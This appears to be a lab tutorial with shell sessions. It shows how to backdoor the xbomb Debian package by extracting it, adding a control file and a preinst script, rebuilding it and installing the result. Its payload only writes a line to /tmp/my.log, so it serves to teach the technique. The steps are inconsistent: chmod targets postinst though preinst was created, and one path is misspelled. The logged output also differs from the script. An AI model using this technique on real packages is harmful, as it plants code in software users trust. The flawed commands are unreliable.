```bash
# Download the .deb file in which you want to install the backdoor
$ sudo apt-get --download-only install xbomb

# Make a directory and copy .deb file into the newly created directory
$ mkdir /tmp/evil
$ sudo mv /var/cache/apt/archives/xbomb_2.2b-1build1_amd64.deb /tmp/evil
$ cd /tmp/evil/

# Extract the contents of .deb package into work directory
$ dpkg -x xbomb_2.2b-1build1_amd64.deb work

# Make DEBIAN directory inside work directory
$ mkdir /tmp/evil/work/DEBIAN

# Create a control file inside the DEBIAN directory
student@student:/tmpevil/work/DEBIAN$ cat control

cat control
Package: xbomb
Version: 2.2b-1
Section: Games and Amusement
Priority: optional
Architecture: i386

Description: a text-based minesweeper
 xbomb is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use.
```
In our DEBIAN directory, we’ll create a file named preinst that contains the following
```bash
student@student:/tmp/evil/work/DEBIAN# cat preinst
#!/bin/sh

echo "ran preinst of client at $(date)." >> /tmp/my.log
```
We’ll now make our pre-installation script executable and build our new package. 
The built file will be named work.deb so we will want to change that to xbomb.deb
```bash
student@student:/tmp/evil/work/DEBIAN$ chmod 755 postinst
student@student:/tmp/evil/work/DEBIAN$ dpkg-deb --build /tmp/evil/work
dpkg-deb: building package `xbomb' in `/tmp/evil/work.deb'.

student@student:/tmp/evil$ mv work.deb xbomb.deb
```
Now, we can copy xbomb.deb to home folder and double click for installation. In order to confirm that the preinstl script ran check /tmp/my.log file.
```
$ cat /tmp/my.log
ran preinst client at Tue Jul 14 22:06:59 xxx xxxx.
```

In order to uninstall the .deb file
```bash
$ sudo dpkg -P xbomb
```
